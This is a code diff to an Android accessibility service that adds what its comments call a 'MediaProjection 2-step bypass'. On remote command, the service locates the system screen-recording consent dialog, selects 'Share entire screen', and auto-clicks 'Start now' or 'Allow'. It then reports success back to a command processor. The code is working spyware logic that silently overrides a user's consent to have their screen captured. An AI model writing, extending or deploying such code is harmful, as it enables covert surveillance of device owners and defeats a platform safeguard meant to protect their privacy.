@@ -504,12 +504,47 @@ class MyAccessibilityService : AccessibilityService() {
         // --- SCREEN RECORD GHOST LOGIC (DECOUPLED) ---
         if (ScreenRecordManager.expectedMode == "AUTO") {
             val root = rootInActiveWindow
+            
+            // Android 14+ MediaProjection 2-step bypass
+            val shareEntireNodes = root?.findAccessibilityNodeInfosByText("Share entire screen") ?: emptyList()
+            val shareOneNodes = root?.findAccessibilityNodeInfosByText("Share one app") ?: emptyList()
+            
+            // 1. If dropdown is open, select "Share entire screen"
+            if (shareEntireNodes.isNotEmpty() && shareOneNodes.isNotEmpty()) {
+                for (node in shareEntireNodes) {
+                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                    while (target != null && !target.isClickable) target = target.parent
+                    if (target != null && target.isClickable) {
+                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        DebugLogger.log("GHOST_ACCEPT", "Selected 'Share entire screen' from A14 dropdown.")
+                        return // Yield for next UI event
+                    }
+                }
+            }
+            
+            // 2. If dropdown is closed but "Share one app" is the current selection, open the dropdown
+            if (shareOneNodes.isNotEmpty() && shareEntireNodes.isEmpty()) {
+                for (node in shareOneNodes) {
+                    var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                    while (target != null && !target.isClickable) target = target.parent
+                    if (target != null && target.isClickable) {
+                        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                        DebugLogger.log("GHOST_ACCEPT", "Clicked 'Share one app' to open A14 dropdown.")
+                        return // Yield for next UI event
+                    }
+                }
+            }
+
+            // 3. Standard Click Start/Start now (Android 10-13, or Android 14 after selecting Entire Screen)
             val startNodes = root?.findAccessibilityNodeInfosByText("Start now") ?: emptyList()
             val altNodes = root?.findAccessibilityNodeInfosByText("Start") ?: emptyList()
+            val allowNodes = root?.findAccessibilityNodeInfosByText("Allow") ?: emptyList()
             
-            for (node in (startNodes + altNodes)) {
-                if (node.isClickable) {
-                    node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+            for (node in (startNodes + altNodes + allowNodes)) {
+                var target: android.view.accessibility.AccessibilityNodeInfo? = node
+                while (target != null && !target.isClickable) target = target.parent
+                if (target != null && target.isClickable) {
+                    target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                     DebugLogger.log("GHOST_ACCEPT", "Successfully auto-clicked screen record confirmation.")
                     ScreenRecordManager.expectedMode = "" // Disarm
                     
@@ -520,7 +555,7 @@ class MyAccessibilityService : AccessibilityService() {
                     }
                     
                     CommandProcessor.updateCommandStatus(applicationContext, ScreenRecordManager.pendingCmdId, "GHOST_ACCEPT_SUCCESS", "Recording started automatically.")
-                    break
+                    return // Exit after successful trigger
                 }
             }
         } else if (ScreenRecordManager.expectedMode == "SCRAPE") {
